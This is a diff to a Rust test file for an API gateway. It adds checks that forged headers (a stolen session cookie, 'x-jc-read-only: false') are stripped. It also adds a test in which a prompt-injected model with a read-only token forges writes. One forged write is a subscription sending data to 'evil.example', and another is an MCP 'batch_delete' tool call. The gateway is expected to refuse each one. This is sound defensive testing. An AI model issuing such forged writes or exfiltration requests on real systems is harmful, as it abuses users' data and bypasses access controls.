@@ -34,6 +34,7 @@ const FORGED: &[(&str, &str)] = &[
     ("x-jc-client", "portal-api"),
     ("x-jc-restricted", "true"),
     ("x-jc-did", "did:web:forged.example"),
+    ("x-jc-read-only", "false"),
     ("cookie", "session=stolen"),
 ];
 
@@ -180,6 +181,7 @@ fn assert_verified(headers: &HeaderMap, groups: &[&str]) {
     assert!(values(headers, "x-jc-client").is_empty(), "{headers:?}");
     assert!(values(headers, "x-jc-restricted").is_empty(), "{headers:?}");
     assert!(values(headers, "x-jc-did").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-read-only").is_empty(), "{headers:?}");
     assert!(headers.get("authorization").is_none(), "{headers:?}");
     assert!(headers.get("cookie").is_none(), "{headers:?}");
 }
@@ -636,4 +638,139 @@ async fn read_versions_reaches_the_broker_only_on_the_spaces_grant() {
         "{:?}",
         hops[1].headers
     );
+}
+
+/// Jana's token with `scope`: `jc:read-only` makes it a read-only connector's (T-5955).
+fn scoped_token(realm: &common::Realm, scope: &str) -> String {
+    realm.mint(&json!({
+        "iss": common::ISSUER,
+        "sub": "0f5a",
+        "aud": "context-gateway",
+        "preferred_username": "jana",
+        "groups": ["/ovzdusie"],
+        "realm_access": { "roles": ["steward"] },
+        "scope": scope,
+        "exp": common::in_seconds(300),
+        "iat": common::in_seconds(-10),
+    }))
+}
+
+/// The organization Endpoint with a steward grant of every write the tests forge.
+fn writer_app(broker: &str, realm: &common::Realm) -> Router {
+    let mut air = endpoint(AIR, Audience::Organization, "steward");
+    air.policies = vec![serde_norway::from_str(
+        "contextSpaceRef: ovzdusie\n\
+         assigner: did:web:banskabystrica.sk\n\
+         assignee: { kind: role, id: steward }\n\
+         operations: [queryEntity, retrieveEntity, createEntity, updateAttrs, appendAttrs, \
+         deleteEntity, upsertBatch, mergeEntity, createSubscription]\n",
+    )
+    .expect("the policy spec parses")];
+    let gateway = Gateway::new(
+        Broker::new(broker),
+        Box::new(PolicyPdp),
+        "banskabystrica.sk",
+    )
+    .serve(vec![air])
+    .authenticate(
+        Arc::new(realm.verifier()),
+        ServiceAccounts::new(),
+        Some(HOST.to_owned()),
+    );
+    router(Arc::new(gateway))
+}
+
+/// S-49 (T-5955): a prompt-injected model holding a read-only connector's token forges writes
+/// below the tools. Each is refused 403 before the broker, although the person may write; the
+/// same requests with the person's ordinary token pass the gateway. Reads go on, and the hop
+/// tells the broker the caller is read-only, so its own engine refuses a write too.
+#[tokio::test]
+async fn a_read_only_token_reads_and_every_forged_write_is_refused_before_the_broker() {
+    let realm = common::Realm::new();
+    let base = format!("/api/endpoint/{AIR}/ngsi-ld/v1");
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+    let attrs = json!({ "pm10": { "type": "Property", "value": 1 } });
+    let writes = [
+        (
+            Method::POST,
+            format!("{base}/entities"),
+            Some(entity.clone()),
+        ),
+        (
+            Method::PATCH,
+            format!("{base}/entities/{ENTITY}/attrs"),
+            Some(attrs.clone()),
+        ),
+        (
+            Method::POST,
+            format!("{base}/entities/{ENTITY}/attrs"),
+            Some(attrs.clone()),
+        ),
+        (
+            Method::PATCH,
+            format!("{base}/entities/{ENTITY}"),
+            Some(attrs),
+        ),
+        (Method::DELETE, format!("{base}/entities/{ENTITY}"), None),
+        (
+            Method::POST,
+            format!("{base}/entityOperations/upsert"),
+            Some(json!([entity])),
+        ),
+        (
+            Method::POST,
+            format!("{base}/subscriptions"),
+            Some(
+                json!({ "type": "Subscription", "entities": [{ "type": "AirQualityObserved" }],
+                         "notification": { "endpoint": { "uri": "https://evil.example/n" } } }),
+            ),
+        ),
+        (
+            Method::POST,
+            format!("/api/endpoint/{AIR}/mcp"),
+            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+                         "params": { "name": "batch_delete", "arguments": { "ids": [ENTITY] } } })),
+        ),
+    ];
+    let reason = [("jc-reason", "S-49")];
+    for (method, path, body) in &writes {
+        let broker = common::BrokerStub::start(vec![json!([])]).await;
+        let app = writer_app(&broker.url, &realm);
+        let forged = request(
+            method.clone(),
+            path,
+            Some(&scoped_token(&realm, "openid jc:read-only")),
+            &reason,
+            body.clone(),
+        );
+        let (code, problem) = answer(app.clone(), forged).await;
+        assert_eq!(code, StatusCode::FORBIDDEN, "{method} {path}: {problem}");
+        let hops = broker.hops();
+        assert!(hops.is_empty(), "{method} {path}: {hops:?}");
+        let person = request(
+            method.clone(),
+            path,
+            Some(&scoped_token(&realm, "openid")),
+            &reason,
+            body.clone(),
+        );
+        let (code, problem) = answer(app, person).await;
+        assert_ne!(code, StatusCode::FORBIDDEN, "{method} {path}: {problem}");
+    }
+
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    status(
+        writer_app(&broker.url, &realm),
+        request(
+            Method::GET,
+            &query(),
+            Some(&scoped_token(&realm, "openid jc:read-only")),
+            &[],
+            None,
+        ),
+    )
+    .await;
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    assert_eq!(values(&hops[0].headers, "x-jc-read-only"), ["true"]);
 }
